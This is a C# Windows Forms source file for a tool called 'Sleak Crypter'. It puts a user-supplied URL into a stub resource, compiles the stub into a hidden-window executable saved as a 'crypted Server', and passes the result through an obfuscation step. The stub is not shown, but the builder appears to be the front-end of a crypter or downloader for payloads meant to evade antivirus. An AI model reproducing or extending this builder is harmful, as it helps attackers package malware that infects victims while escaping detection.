using Microsoft.CSharp;
using SleakDirectFile.Tools;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SleakDirectFile
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

        }



        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            encode en = new encode();
            en.Show();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (terms.Checked)
            {
                string sStub = Properties.Resources.Stub.Replace("%URL%",textBox1.Text);

                using (SaveFileDialog fSaveDialog = new SaveFileDialog())
                {

                    fSaveDialog.Filter = "Executable (*.exe)|*.exe";
                    fSaveDialog.Title = "Save crypted Server...";

                    if (fSaveDialog.ShowDialog() == DialogResult.OK)
                    {

                        using (CSharpCodeProvider csCodeProvider = new CSharpCodeProvider(new Dictionary<string, string>
            {
                {"CompilerVersion", "v4.0"}
            }))
                        {
                            CompilerParameters cpParams = new CompilerParameters(null, fSaveDialog.FileName, true);

                            cpParams.CompilerOptions = "/t:winexe /unsafe /platform:x86 /debug-";
                            cpParams.ReferencedAssemblies.Add("System.dll");
                            cpParams.ReferencedAssemblies.Add("System.Management.dll");
                            cpParams.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                            cpParams.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
                            cpParams.ReferencedAssemblies.Add("System.Threading.Tasks.dll");
                            

                            csCodeProvider.CompileAssemblyFromSource(cpParams, sStub);

                            if (Obfuscate.Rename(fSaveDialog.FileName))
                            {
                                File.Delete(fSaveDialog.FileName);
                                MessageBox.Show("File Crypted Successfully!", "Sleak Crypter", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }
                            else
                            {
                                MessageBox.Show("Could Not Crypt File Successfully!", "Sleak Crypter", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }

                        }

                        

                    }
                }
            }
            else
            {
                MessageBox.Show("Please Accept The Rules and Regulations", "Sleak Crypter", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        

        private void button3_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void label2_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.hastepaste.com/");
        }

        Point mouseLocation;
        private void mousedown(object sender, MouseEventArgs e)
        {
            mouseLocation = new Point(-e.X, -e.Y);

        }

        private void mouse_Move(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                Point mousePose = Control.MousePosition;
                mousePose.Offset(mouseLocation.X, mouseLocation.Y);
                Location = mousePose;
            }
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }
    }
}
